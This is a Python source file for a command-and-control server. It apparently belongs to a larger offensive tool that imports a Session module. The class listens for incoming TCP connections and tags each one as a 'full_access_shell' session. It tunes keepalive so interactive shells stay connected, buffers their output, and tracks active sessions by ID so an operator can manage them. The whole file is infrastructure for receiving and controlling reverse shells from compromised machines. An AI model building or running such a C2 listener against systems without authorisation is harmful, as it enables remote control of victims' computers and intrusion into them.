import asyncio
import socket
from typing import Dict, List, Optional

from .session import Session


class C2Server:
    def __init__(self, bind_host: str, port: int):
        self.bind_host = bind_host
        self.port = port
        self.active_sessions: Dict[str, Session] = {}
        self.server: Optional[asyncio.Server] = None

    def _configure_socket(self, sock: socket.socket):
        """Configure TCP keepalive and socket flags to prevent premature disconnection."""
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # TCP Keepalive idle timeout (seconds before sending keepalive probes)
            if hasattr(socket, "TCP_KEEPIDLE"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
            elif hasattr(socket, "TCP_KEEPALIVE"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 30)
            # Interval between keepalive probes
            if hasattr(socket, "TCP_KEEPINTVL"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            # Probe count before closing
            if hasattr(socket, "TCP_KEEPCNT"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            # Disable Nagle's algorithm for interactive shells
            if hasattr(socket, "TCP_NODELAY"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except (OSError, AttributeError):
            pass

    async def _handle_client_connection(self, reader, writer):
        peername = writer.get_extra_info("peername") or ("unknown", 0)
        sock = writer.get_extra_info("socket")
        if sock:
            self._configure_socket(sock)

        session = Session(reader, writer, peername, session_type="full_access_shell")
        self.active_sessions[session.id] = session
        print(f"[*] New session {session.id} — {session.ip_address}:{session.port}")

        try:
            while True:
                data = await reader.read(65536)
                if not data:
                    break
                text = data.decode("utf-8", errors="replace")
                session.output_buffer.append(text)
        except (ConnectionResetError, BrokenPipeError, asyncio.CancelledError):
            pass
        except Exception as e:
            print(f"[-] Error in session {session.id}: {e}")
        finally:
            print(f"[*] Session {session.id} from {session.ip_address} closed.")
            # Remove the session when it terminates
            if session.id in self.active_sessions:
                del self.active_sessions[session.id]
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    def get_sessions_summary(self) -> List[dict]:
        """Returns a summary of active sessions for display."""
        return [session.to_dict() for session in self.active_sessions.values()]

    def get_session_by_id(self, session_id: str) -> Optional[Session]:
        """Returns a Session instance by ID."""
        return self.active_sessions.get(session_id)
        
    async def start(self):
        self.server = await asyncio.start_server(
            self._handle_client_connection, self.bind_host, self.port
        )
        print(f"[*] C2 listening on {self.bind_host}:{self.port}")
        async with self.server:
            await self.server.serve_forever()

    def stop(self):
        if self.server:
            self.server.close()
            # print("[*] C2 Server stopped.")